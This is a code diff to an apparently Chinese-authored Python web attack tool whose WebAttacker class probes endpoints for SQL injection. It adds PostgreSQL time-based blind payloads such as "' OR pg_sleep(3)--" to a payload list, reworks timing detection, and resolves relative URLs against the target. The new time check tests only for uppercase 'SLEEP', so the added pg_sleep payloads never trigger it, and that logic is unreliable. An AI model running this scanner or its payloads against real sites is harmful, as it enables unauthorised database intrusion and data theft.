@@ -45,8 +45,9 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 try:
     import requests
-    from requests.packages.urllib3.exceptions import InsecureRequestWarning
-    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    import urllib3
+    from urllib3.exceptions import InsecureRequestWarning
+    urllib3.disable_warnings(InsecureRequestWarning)
 except ImportError:
     print("[!] 需要安装 requests: pip install requests")
     exit(1)
@@ -84,6 +85,8 @@ SQLI_PAYLOADS = [
     "'; WAITFOR DELAY '0:0:3'--", "1; WAITFOR DELAY '0:0:3'--",
     "' AND SLEEP(3)--", "1 AND SLEEP(3)",
     "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
+    # 时间盲注 - PostgreSQL
+    "' OR pg_sleep(3)--", "1; SELECT pg_sleep(3)--",
     # 联合查询
     "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
     "' UNION SELECT NULL,NULL,NULL--",
@@ -488,13 +491,7 @@ class WebAttacker:
                 # 时间盲注检测
                 time_based = False
                 if "SLEEP" in payload or "WAITFOR" in payload:
-                    start = time.time()
-                    if method == "GET":
-                        self._request("GET", f"{url}?{param}={quote(payload)}")
-                    else:
-                        self._request("POST", url, data={param: payload})
-                    elapsed = time.time() - start
-                    time_based = elapsed >= 3.0
+                    time_based = resp.elapsed.total_seconds() >= 3.0
 
                 # 判定
                 if error_found:
@@ -519,6 +516,9 @@ class WebAttacker:
         points = []
         for ep in self.discovered_endpoints:
             url = ep.get("url", "")
+            # 相对路径处理: 拼接到 target
+            if url and not url.startswith("http"):
+                url = urljoin(self.target, url)
             if "?" in url:
                 # 提取 URL 参数
                 base, qs = url.split("?", 1)
@@ -1776,7 +1776,6 @@ def main():
         auth_header=args.auth,
         depth=args.depth,
         skip_ids=args.skip_ids,
-        only_modules=args.only,
         verify_ssl=args.verify_ssl,
     )
 
